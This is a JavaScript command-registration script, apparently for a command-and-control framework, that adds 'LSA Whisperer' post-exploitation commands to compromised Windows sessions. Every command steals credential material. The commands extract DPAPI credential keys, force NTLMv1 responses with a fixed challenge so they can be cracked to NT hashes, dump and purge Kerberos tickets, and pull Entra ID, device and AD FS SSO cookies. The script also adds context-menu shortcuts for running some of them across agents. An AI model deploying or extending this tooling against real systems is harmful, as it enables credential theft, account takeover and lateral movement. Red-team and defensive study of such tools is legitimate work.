var metadata = {
    name: "LSAWhisperer-BOF",
    description: "LSA Whisperer BOF - Interact with LSA authentication packages (MSV1_0, Kerberos, CloudAP)"
};

/// ===================================================================
/// MSV1_0 Commands
/// ===================================================================

var cmd_credkey = ax.create_command("lsa-credkey", "Get DPAPI credential key via MSV1_0 (works with Credential Guard)", "lsa-credkey\nlsa-credkey -l 0x3e7");
cmd_credkey.addArgFlagString("-l", "luid", "Target LUID (0 = current session, 0x3e7 = SYSTEM, etc.)", "0");
cmd_credkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["credkey", luid, ""]);
    let bof_path = ax.script_dir() + "_bin/msv1_0_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: GetCredentialKey");
});


var cmd_strongcredkey = ax.create_command("lsa-strongcredkey", "Get strong DPAPI credential key (Windows 10+)", "lsa-strongcredkey\nlsa-strongcredkey -l 0x3e7");
cmd_strongcredkey.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_strongcredkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["strongcredkey", luid, ""]);
    let bof_path = ax.script_dir() + "_bin/msv1_0_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: GetStrongCredentialKey");
});


var cmd_ntlmv1 = ax.create_command("lsa-ntlmv1", "Generate NTLMv1 response with chosen challenge (crackable to NT hash)", "lsa-ntlmv1\nlsa-ntlmv1 -l 0x1a2b3c -c 1122334455667788");
cmd_ntlmv1.addArgFlagString("-l", "luid", "Target LUID (requires SYSTEM)", "0");
cmd_ntlmv1.addArgFlagString("-c", "challenge", "Server challenge (16 hex chars, default: 1122334455667788 for crack.sh)", "1122334455667788");
cmd_ntlmv1.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";
    let challenge = parsed_json["challenge"] || "1122334455667788";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["ntlmv1", luid, challenge]);
    let bof_path = ax.script_dir() + "_bin/msv1_0_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: Lm20GetChallengeResponse (NTLMv1)");
});


/// ===================================================================
/// Kerberos Commands
/// ===================================================================

var cmd_klist = ax.create_command("lsa-klist", "List cached Kerberos tickets", "lsa-klist\nlsa-klist -l 0x3e7");
cmd_klist.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_klist.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["klist", luid, ""]);
    let bof_path = ax.script_dir() + "_bin/kerberos_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: Kerberos klist");
});


var cmd_kdump = ax.create_command("lsa-dump", "Dump all Kerberos tickets as base64 .kirbi", "lsa-dump\nlsa-dump -l 0x3e7");
cmd_kdump.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_kdump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["dump", luid, ""]);
    let bof_path = ax.script_dir() + "_bin/kerberos_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: Kerberos dump");
});


var cmd_purge = ax.create_command("lsa-purge", "Selectively purge Kerberos tickets", "lsa-purge\nlsa-purge -l 0x3e7 -s krbtgt/DOMAIN.COM");
cmd_purge.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_purge.addArgFlagString("-s", "server", "Server name filter (empty = purge all)", "");
cmd_purge.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";
    let server = parsed_json["server"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,cstr", ["purge", luid, server]);
    let bof_path = ax.script_dir() + "_bin/kerberos_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: Kerberos purge");
});


/// ===================================================================
/// CloudAP Commands
/// ===================================================================

var cmd_ssocookie = ax.create_command("lsa-ssocookie", "Get Entra ID SSO cookie via CloudAP", "lsa-ssocookie\nlsa-ssocookie -l 0x3e7");
cmd_ssocookie.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_ssocookie.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr", ["ssocookie", luid]);
    let bof_path = ax.script_dir() + "_bin/cloudap_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: CloudAP SSO Cookie");
});


var cmd_devicessocookie = ax.create_command("lsa-devicessocookie", "Get device SSO cookie via CloudAP", "lsa-devicessocookie\nlsa-devicessocookie -l 0x3e7");
cmd_devicessocookie.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_devicessocookie.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr", ["devicessocookie", luid]);
    let bof_path = ax.script_dir() + "_bin/cloudap_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: CloudAP Device SSO Cookie");
});


var cmd_enterprisesso = ax.create_command("lsa-enterprisesso", "Get AD FS enterprise SSO cookie via CloudAP", "lsa-enterprisesso\nlsa-enterprisesso -l 0x3e7");
cmd_enterprisesso.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_enterprisesso.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr", ["enterprisesso", luid]);
    let bof_path = ax.script_dir() + "_bin/cloudap_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: CloudAP Enterprise SSO Cookie");
});


var cmd_cloudinfo = ax.create_command("lsa-cloudinfo", "Get cloud provider info and status via CloudAP", "lsa-cloudinfo\nlsa-cloudinfo -l 0x3e7");
cmd_cloudinfo.addArgFlagString("-l", "luid", "Target LUID (0 = current session)", "0");
cmd_cloudinfo.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let luid = parsed_json["luid"] || "0";

    let bof_params = ax.bof_pack("cstr,cstr", ["info", luid]);
    let bof_path = ax.script_dir() + "_bin/cloudap_bof." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "LSA Whisperer: CloudAP Info");
});


/// ===================================================================
/// Group Registration
/// ===================================================================

var group_lsawhisperer = ax.create_commands_group("LSAWhisperer-BOF", [
    cmd_credkey, cmd_strongcredkey, cmd_ntlmv1,
    cmd_klist, cmd_kdump, cmd_purge,
    cmd_ssocookie, cmd_devicessocookie, cmd_enterprisesso, cmd_cloudinfo
]);
ax.register_commands_group(group_lsawhisperer, ["beacon", "gopher", "kharon"], ["windows"], []);


/// ===================================================================
/// Context Menu
/// ===================================================================

let klist_action = menu.create_action("Kerberos klist", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "lsa-klist")) });
menu.add_session_access(klist_action, ["beacon", "gopher", "kharon"], ["windows"]);

let credkey_action = menu.create_action("DPAPI CredKey", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "lsa-credkey")) });
menu.add_session_access(credkey_action, ["beacon", "gopher", "kharon"], ["windows"]);

let cloudinfo_action = menu.create_action("Cloud Info", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "lsa-cloudinfo")) });
menu.add_session_access(cloudinfo_action, ["beacon", "gopher", "kharon"], ["windows"]);
